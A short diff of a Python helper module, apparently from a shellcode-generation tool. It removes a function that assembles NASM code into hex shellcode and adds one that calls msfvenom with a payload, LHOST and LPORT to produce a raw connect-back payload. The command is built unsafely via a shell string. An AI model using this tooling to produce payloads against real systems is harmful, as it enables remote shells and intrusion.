@@ -28,36 +28,6 @@ def sed_files(folderpath, old, new):
         if os.path.isfile(filepath):
             sed_file(filepath, old, new)
 
-def nasm2instructions(filepath):
-    # with open("asm/test.txt",'r') as f:
-    #     content = f.read()
-    #     print(content)
-    #     return content
-    print("\nSetting up shellcode...")
-    obj_file = "temp/shell.o"
-    shell_file = "temp/shell"
-    instructions_file = "temp/instructions_trash"
-
-    nasm_cmd = ["nasm", "-f", "elf64", filepath, "-o", obj_file]
-    ld_cmd = ["ld", "-w", obj_file, "-o", shell_file]
-    dd_cmd = ["dd", f"if={shell_file}", f"of={instructions_file}", "bs=1", "skip=4096", "count=1280"]
-    xxd_cmd = ["xxd", "-p", instructions_file]
-    try:
-        result = subprocess.run(nasm_cmd, check=True)
-
-        result = subprocess.run(ld_cmd, check=True)
-
-        subprocess.run(dd_cmd, check=True)
-
-        result = subprocess.run(f"xxd -p {instructions_file}", shell=True, check=True, capture_output=True, text=True)
-        hexa_content = result.stdout.strip()
-
-        instructions = hexa_content.split("00000000000000")[0].replace("\n", "")
-        return instructions
-    
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors de l'exécution de la commande : {e}")
-        return None
 
 def txt2instructions(filepath):
     with open(filepath, 'r') as file:
@@ -171,3 +141,7 @@ def generate_high_entropy_int(min_val=0x1111, max_val=0xFFFF):
         
         if min_avg <= avg <= max_avg and min_total <= total <= max_total:  # Good distribution
             return num
+        
+def generate_payload(payload, lhost, lport):
+    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
+    subprocess.run(command, shell=True, check=True)
